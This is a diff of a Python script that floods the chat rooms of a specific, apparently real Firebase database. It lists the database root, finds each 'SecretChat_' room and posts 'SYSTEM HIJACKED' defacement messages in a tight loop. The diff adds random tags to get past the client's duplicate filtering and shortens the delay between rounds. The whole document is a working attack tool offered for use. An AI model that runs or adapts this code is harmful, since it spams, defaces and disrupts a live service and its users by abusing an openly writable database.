@@ -1,47 +1,48 @@
 import time
+import random
 import requests
 
-# Base Firebase database URL
 database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"
-
-payload = {
-    "Sender": "CHAT HACKED BY FORBID",
-    "Message": "SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway",
-    "Timestamp": 0,
-    "Aura": "voidWings",
-    "Color": "red"
-}
 
 headers = {
     "Content-Type": "application/json"
 }
 
-print("[FORBID] Nuclear Global Scanner & Spammer Initialized...")
+print("[FORBID] Nuclear Bypass Spammer Initialized...")
 
 session = requests.Session()
 
 while True:
     try:
-        # Step 1: Fetch all root keys in the database to find active SecretChat rooms
+        # Step 1: Fetch all active server rooms
         root_response = session.get(f"{database_url}/.json", timeout=5)
         
         if root_response.status_code == 200:
             data = root_response.json()
             if isinstance(data, dict):
-                # Look for any key starting with "SecretChat_"
                 for key in data.keys():
                     if key.startswith("SecretChat_"):
                         room_url = f"{database_url}/{key}.json"
-                        payload["Timestamp"] = int(time.time() * 1000)
                         
-                        # Step 2: Flood every active room found
+                        # Generate random tag so the client doesn't block it as a duplicate
+                        rand_tag = random.randint(1000, 99999)
+                        
+                        payload = {
+                            "Sender": f"CHAT HACKED [{rand_tag}]",
+                            "Message": f"SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway #{rand_tag}",
+                            "Timestamp": int(time.time() * 1000) + rand_tag,
+                            "Aura": "voidWings",
+                            "Color": "red"
+                        }
+                        
+                        # Step 2: Flood the room
                         session.post(room_url, json=payload, headers=headers, timeout=3)
-                        print(f"[FORBID] Nuke packet delivered to room: {key}")
+                        print(f"[FORBID] Flood packet sent to: {key}")
         else:
-            print(f"[FORBID] Failed to scan database root: {root_response.status_code}")
+            print(f"[FORBID] Root scan failed: {root_response.status_code}")
             
     except Exception as e:
-        print(f"[FORBID] Error during global scan/spam: {e}")
+        print(f"[FORBID] Error: {e}")
         
-    # Brief pause before scanning and hitting everyone again
-    time.sleep(0.5)
+    # High-speed loop interval
+    time.sleep(0.1)
